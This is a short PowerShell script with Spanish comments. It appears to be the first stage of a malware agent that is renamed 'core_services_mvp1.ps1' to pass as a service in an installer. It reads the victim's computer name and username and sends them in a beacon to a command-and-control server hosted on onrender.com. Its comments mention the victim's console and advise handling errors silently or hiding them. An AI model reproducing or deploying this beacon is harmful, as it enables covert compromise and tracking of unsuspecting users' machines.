# agent.ps1 (MVP Fase 1 - Renombrado a core_services_mvp1.ps1 para el instalador)
# Este script solo envía un beacon al C2 y luego termina.

# --- CONFIGURACIÓN ---
# Modifica estas variables para que coincidan con tu entorno C2 desplegado en Render
$c2BaseUrl = "https://exa-sw-fr2c.onrender.com" # Reemplaza con la URL base de tu C2 en Render (ej. "https://mi-c2.onrender.com")
# El puerto ya está implícito en la URL HTTPS (443)
# --------------------

$agentId = try {
    $computerName = $env:COMPUTERNAME
    $userName = $env:USERNAME
    $rawAgentId = "$($computerName)_$($userName)"
    $cleanedAgentId = $rawAgentId -replace '[^a-zA-Z0-9_-]', '' # Limpiar caracteres especiales
    if ([string]::IsNullOrWhiteSpace($cleanedAgentId)) { "UnknownAgent_F1_$(Get-Random)" } else { $cleanedAgentId }
} catch {
    "UnknownAgent_F1_$(Get-Random)" # Fallback más robusto
}

$beaconUrl = "$($c2BaseUrl)/api/updates?uid=$($agentId)&phase=mvp1_agent_render"

# Descomenta la siguiente línea para depuración si es necesario (verás la URL en la consola de la víctima)
# Write-Host "Intentando enviar beacon a: $beaconUrl"

try {
    Invoke-RestMethod -Uri $beaconUrl -Method Get -TimeoutSec 10 -UseBasicParsing
    # Para depuración inicial en la víctima, podrías añadir:
    # Write-Host "Beacon enviado exitosamente a $beaconUrl"
} catch {
    # Para depuración inicial en la víctima, podrías añadir:
    # Write-Host "Error enviando beacon a $beaconUrl : $($_.Exception.Message)"
    # En un escenario real, este error debería manejarse silenciosamente o registrarse localmente de forma oculta.
}

# El script termina aquí para MVP1. No hay bucle.
